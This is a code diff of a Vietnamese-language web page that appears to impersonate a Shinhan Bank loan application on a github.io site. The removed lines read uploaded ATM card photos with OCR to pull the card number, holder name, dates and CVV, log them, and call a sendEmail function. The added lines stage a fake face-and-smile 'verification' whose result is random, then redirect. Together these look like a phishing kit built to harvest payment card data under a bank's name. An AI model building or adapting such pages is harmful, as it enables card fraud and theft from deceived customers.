-            await sendEmail();
-            $('#atmCardFrontImage, #atmCardBackImage').val('');
-            $('#atmCardFrontInfo, #atmCardBackInfo').text('');
-            $('#atmCardFrontPreview, #atmCardBackPreview').hide();
-            userData.currentStep = 4;
-            saveToLocalStorage();
-            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
-        }
-
-        async function extractCardInfo(file, isFront) {
-            $(`#${isFront ? 'atmCardFrontInfo' : 'atmCardBackInfo'}`).text('Đang trích xuất thông tin...');
-            try {
-                const { data: { text } } = await Tesseract.recognize(file, 'eng', { logger: m => console.log(m) });
-                console.log('Extracted text:', text);
-                $(`#${isFront ? 'atmCardFrontInfo' : 'atmCardBackInfo'}`).text('');
-                if (isFront) {
-                    const cardNumber = text.match(/\d{16}/)?.[0];
-                    const cardHolderName = text.match(/[A-Z\s]+/i)?.[0];
-                    const issueDate = text.match(/(0[1-9]|[12]\d|3[01])\/(0[1-9]|1[0-2])\/\d{4}/)?.[0];
-                    const expiryDate = text.match(/(0[1-9]|1[0-2])\/\d{2}/)?.[0];
-                    console.log('Front extracted:', { cardNumber, cardHolderName, issueDate, expiryDate });
-                    if (cardNumber) userData.atmCard.cardNumber = CryptoJS.AES.encrypt(cardNumber, 'shinhan-secret-key').toString();
-                    if (cardHolderName) userData.atmCard.cardHolderName = cardHolderName;
-                    if (issueDate) userData.atmCard.issueDate = issueDate;
-                    if (expiryDate) userData.atmCard.expiryDate = expiryDate;
-                    $('#cardNumber').val(cardNumber || '');
-                    $('#cardHolderName').val(cardHolderName || '');
-                    $('#issueDate').val(issueDate || '');
-                    $('#expiryDate').val(expiryDate || '');
-                } else {
-                    const cvv = text.match(/\d{3}/)?.[0];
-                    console.log('Back extracted:', { cvv });
-                    if (cvv) userData.atmCard.cvv = CryptoJS.AES.encrypt(cvv, 'shinhan-secret-key').toString();
-                    $('#cvv').val(cvv || '');
-                }
-                saveToLocalStorage();
-                updateButtonState();
-            } catch (error) {
-                console.error('OCR error:', error);
-                $(`#${isFront ? 'atmCardFrontInfo' : 'atmCardBackInfo'}`).text('');
-                $(`#${isFront ? 'atmCardFrontError' : 'atmCardBackError'}`).text('Không thể trích xuất thông tin. Vui lòng thử lại hoặc nhập thủ công.').show();
-            }
-        }
-
-        $('#atmCardFrontImage, #atmCardBackImage').on('change', async function(e) {
-            const file = e.target.files[0];
-            const inputId = e.target.id;
-            const isFront = inputId === 'atmCardFrontImage';
-            $(`#${inputId}Error`).hide();
-            $(`#${inputId}Info`).text('');
-            $(`#${inputId}Preview`).hide();
-            if (file) {
-                const isValid = await validateFile(file, inputId);
-                if (isValid) {
-                    $(`#${inputId}Info`).text(DOMPurify.sanitize(`${file.name} (${Math.round(file.size / 1024)} KB)`));
-                    $(`#${inputId}Preview`).attr('src', URL.createObjectURL(file)).show();
-                    if (inputId === 'atmCardFrontImage') {
-                        userData.atmCard.frontImage = URL.createObjectURL(file);
-                    } else if (inputId === 'atmCardBackImage') {
-                        userData.atmCard.backImage = URL.createObjectURL(file);
-                    }
-                    saveToLocalStorage();
-                    await extractCardInfo(file, isFront);
-                } else {
-                    $(this).val('');
-                }
-            }
-            updateButtonState();
-        });
-
-        $('#saveCardInfo').on('click', function() {
-            console.log('Save button clicked');
-            const form = $('#manualInputModal').find('.modal-body')[0];
-            form.classList.add('was-validated');
-            if (validateCardInfo()) {
-                console.log('Card info validated:', {
-                    cardNumber: $('#cardNumber').val(),
-                    cardHolderName: $('#cardHolderName').val(),
-                    issueDate: $('#issueDate').val(),
-                    expiryDate: $('#expiryDate').val(),
-                    cvv: $('#cvv').val()
-                });
-                userData.atmCard = {
-                    cardNumber: CryptoJS.AES.encrypt($('#cardNumber').val().trim(), 'shinhan-secret-key').toString(),
-                    cardHolderName: $('#cardHolderName').val().trim(),
-                    issueDate: $('#issueDate').val().trim(),
-                    expiryDate: $('#expiryDate').val().trim(),
-                    cvv: CryptoJS.AES.encrypt($('#cvv').val().trim(), 'shinhan-secret-key').toString(),
-                    frontImage: userData.atmCard.frontImage,
-                    backImage: userData.atmCard.backImage
-                };
-                saveToLocalStorage();
-                console.log('Card info saved:', userData.atmCard);
-                $('#manualInputModal').modal('hide');
-                updateButtonState();
+        // Mô phỏng phát hiện khuôn mặt
+        function detectFace() {
+            const isFaceDetected = Math.random() > 0.3;
+            if (!isFaceDetected) {
+                updateStatusMessage('Không phát hiện được khuôn mặt, vui lòng đảm bảo ánh sáng tốt và thử lại');
+                errorMessage.style.display = 'block';
+                setTimeout(detectFace, 3000);
             } else {
-                console.log('Validation failed');
+                updateStatusMessage('Camera đã sẵn sàng, vui lòng cười', true);
+                setTimeout(startSmileDetection, 1000);
+            }
+        }
+
+        // Mô phỏng phát hiện biểu cảm cười với đếm ngược
+        function startSmileDetection() {
+            let countdown = 3;
+            updateStatusMessage(`Giữ biểu cảm cười trong ${countdown}...`, true);
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    updateStatusMessage(`Giữ biểu cảm cười trong ${countdown}...`, true);
+                } else {
+                    clearInterval(countdownInterval);
+                    simulateFaceScan();
+                }
+            }, 1000);
+        }
+
+        // Giả lập quá trình quét khuôn mặt
+        function simulateFaceScan() {
+            toggleScanEffect(true);
+            updateStatusMessage('Đang quét...');
+            setTimeout(() => {
+                toggleScanEffect(false);
+                const isSmileDetected = Math.random() > 0.4;
+                if (isSmileDetected) {
+                    updateStatusMessage('Thành công!');
+                    setTimeout(() => {
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
+                    }, 2000);
+                } else {
+                    updateStatusMessage('Không phát hiện được biểu cảm cười, vui lòng thử lại');
+                    errorMessage.style.display = 'block';
+                    errorMessage.textContent = 'Không phát hiện được biểu cảm cười. Vui lòng thử lại.';
+                    setTimeout(() => {
+                        errorMessage.style.display = 'none';
+                        updateStatusMessage('Camera đã sẵn sàng, vui lòng cười', true);
+                        setTimeout(startSmileDetection, 1000);
+                    }, 3000);
+                }
+            }, 3000);
+        }
+
+        // Sự kiện cho nút micro
+        let isMicActive = false;
+        micButton.addEventListener('click', () => {
+            isMicActive = !isMicActive;
+            if (isMicActive) {
+                micButton.classList.add('active');
+                micButton.textContent = '🔇';
+                alert('Micro đã được bật, vui lòng nói "Xác nhận"');
+            } else {
+                micButton.classList.remove('active');
+                micButton.textContent = '🎙️';
+                alert('Micro đã tắt');
             }
         });
 
-        $('#proceedToStep4Btn').on('click', function(e) {
-            e.preventDefault();
-            proceedToNextStep();
-        });
-
-        $('.btn-primary, .btn-danger, .capture-btn').on('keypress', function(e) {
-            if (e.which === 13) {
-                $(this).click();
+        // Sự kiện cho nút đóng
+        closeButton.addEventListener('click', () => {
+            if (confirm('Bạn có muốn thoát không?')) {
+                window.history.back();
             }
         });
 
-        window.onload = function() {
-            loadUserData();
-            updateButtonState();
+        // Khởi động camera và quét khuôn mặt
+        window.onload = () => {
+            startCamera();
         };
     </script>
 </body>
